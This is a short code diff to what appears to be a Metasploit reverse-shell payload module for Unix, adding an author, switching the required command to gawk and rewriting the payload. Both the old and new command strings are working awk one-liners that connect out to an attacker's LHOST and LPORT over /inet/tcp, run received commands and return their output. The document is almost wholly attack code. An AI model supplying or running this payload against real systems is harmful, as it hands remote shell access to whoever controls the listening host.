@@ -22,7 +22,8 @@ module Metasploit3
 			'Author'        => 
 				[
 					'espreto <robertoespreto[at]gmail.com>',
-					'Ulisses Castro <uss.thebug[at]gmail.com>'
+					'Ulisses Castro <uss.thebug[at]gmail.com>',
+					'Gabriel Quadros <gquadrossilva[at]gmail.com>'
 				],
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'unix',
@@ -30,7 +31,7 @@ module Metasploit3
 			'Handler'       => Msf::Handler::ReverseTcp,
 			'Session'       => Msf::Sessions::CommandShell,
 			'PayloadType'   => 'cmd',
-			'RequiredCmd'   => 'awk',
+			'RequiredCmd'   => 'gawk',
 			'Payload'       =>
 				{
 					'Offsets' => { },
@@ -50,7 +51,7 @@ module Metasploit3
 	# Returns the command string to use for execution
 	#
 	def command_string
-		"awk 'BEGIN{s=\"/inet/tcp/0/#{datastore['LHOST']}/#{datastore['LPORT']}\";while(1){printf \"shell> \"|& s;s|&getline c;if(c){while((c|& getline)>0){print $0|& s}close(c);}}}'"
+		"awk 'BEGIN{for(s=\"/inet/tcp/0/#{datastore['LHOST']}/#{datastore['LPORT']}\";s|&getline c;close(c)){while(c|& getline)print $0|& s}}'"
 	end
 
 end
